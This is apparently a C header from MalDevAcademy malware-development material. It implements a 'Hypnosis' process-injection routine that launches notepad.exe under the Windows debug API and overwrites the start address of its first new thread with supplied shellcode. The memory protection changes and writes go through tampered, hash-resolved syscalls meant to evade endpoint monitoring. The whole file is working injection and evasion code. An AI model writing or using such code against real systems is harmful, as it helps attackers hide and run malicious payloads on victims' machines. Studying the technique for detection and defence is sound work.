// @NUL0x4C | @mrd0x : MalDevAcademy
#pragma once

#include <windows.h>
#include <stdio.h>

// ==========================================================================================================================

//#define ZwAllocateVirtualMemory_CRCA     0x71D7EF35
//#define ZwProtectVirtualMemory_CRCA      0x998153D9
//#define ZwWriteVirtualMemory_CRC32       0xFAB864E6

// ==========================================================================================================================

#define TARGET_PROCESS_PATH		L"C:\\Windows\\System32\\notepad.exe"
#define GET_FILENAMEW(PATH)		(wcsrchr((PATH), L'/') ? wcsrchr((PATH), L'/') + 1 : (wcsrchr((PATH), L'\\') ? wcsrchr((PATH), L'\\') + 1 : (PATH)))

int Hypnosis(LPVOID pBytes, SIZE_T size) {

	PVOID		BaseAddress			= NULL;
	DWORD		dwOldProtection		= 0x00;
	HANDLE		hThread				= NULL;
	SIZE_T RegionSize = size;

	STARTUPINFOW			StartupInfo					= { .cb = sizeof(STARTUPINFOW) };
	PROCESS_INFORMATION		ProcessInfo					= { 0 };
	WCHAR					szTargetProcess[MAX_PATH]	= TARGET_PROCESS_PATH;
	DEBUG_EVENT				DebugEvent					= { 0 };
	SIZE_T					sNumberOfBytesWritten		= 0x00;
	
	if (!CreateProcessW(szTargetProcess, NULL, NULL, NULL, FALSE, DEBUG_ONLY_THIS_PROCESS, NULL, NULL, &StartupInfo, &ProcessInfo)) {
		//printf("[!] CreateProcessW Failed With Error: %d \n", GetLastError());
		DBG("[!] CreateProcessW Failed With Error");
		return -1;
	}

	//printf("[i] %ws Process Created With PID: %d \n", GET_FILENAMEW(TARGET_PROCESS_PATH), ProcessInfo.dwProcessId);

	// Parsing all debug events
	while (WaitForDebugEvent(&DebugEvent, INFINITE)) {

		switch (DebugEvent.dwDebugEventCode) {
		
			// New thread creation
			case CREATE_THREAD_DEBUG_EVENT: {
				BaseAddress = DebugEvent.u.CreateProcessInfo.lpStartAddress;

				//printf("[+] Targetting Thread: %d\n", GetThreadId(DebugEvent.u.CreateThread.hThread));
				//printf("[i] Writing Shellcode At Thread's Start Address: 0x%p \n", DebugEvent.u.CreateProcessInfo.lpStartAddress);
				BaseAddress = DebugEvent.u.CreateProcessInfo.lpStartAddress;
				TAMPER_SYSCALL(ZwProtectVirtualMemory_CRCA, ProcessInfo.hProcess, &BaseAddress, &RegionSize, PAGE_READWRITE, &dwOldProtection, NULL, NULL, NULL, NULL, NULL, NULL);
				
				TAMPER_SYSCALL(ZwWriteVirtualMemory_CRC32, ProcessInfo.hProcess, DebugEvent.u.CreateProcessInfo.lpStartAddress, pBytes, size, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
				DBG("Just Wrote Memory");
				//getchar();
				
				// Change to RX
				TAMPER_SYSCALL(ZwProtectVirtualMemory_CRCA, ProcessInfo.hProcess, &BaseAddress, &RegionSize, PAGE_EXECUTE_READ, &dwOldProtection, NULL, NULL, NULL, NULL, NULL, NULL);

				//if (!WriteProcessMemory(ProcessInfo.hProcess, DebugEvent.u.CreateProcessInfo.lpStartAddress, pBytes, RegionSize, &sNumberOfBytesWritten) || sNumberOfBytesWritten != RegionSize) {
				//	printf("[!] WriteProcessMemory Failed With Error: %d \n", GetLastError());
				//	printf("[i] Wrote %d Of %d Bytes \n", (int)sNumberOfBytesWritten, (int)RegionSize);
				//	return -1;
				//}

				if (!DebugActiveProcessStop(ProcessInfo.dwProcessId)) {
					//printf("[!] DebugActiveProcessStop Failed With Error: %d \n", GetLastError());
					DBG("[!] DebugActiveProcessStop Failed With Error");
					return -1;
				}

				// Resume thread creation
				ContinueDebugEvent(DebugEvent.dwProcessId, DebugEvent.dwThreadId, DBG_CONTINUE);
			
				// Detach child process
				goto _END_OF_FUNC;
			};

			case EXIT_PROCESS_DEBUG_EVENT:
				DBG("[i] Remote Process Terminated \n");
				return 0;

			default:
				break;
		}

		ContinueDebugEvent(DebugEvent.dwProcessId, DebugEvent.dwThreadId, DBG_CONTINUE);
	}
	
_END_OF_FUNC:
	CloseHandle(ProcessInfo.hProcess);
	CloseHandle(ProcessInfo.hThread);
	return 0;
}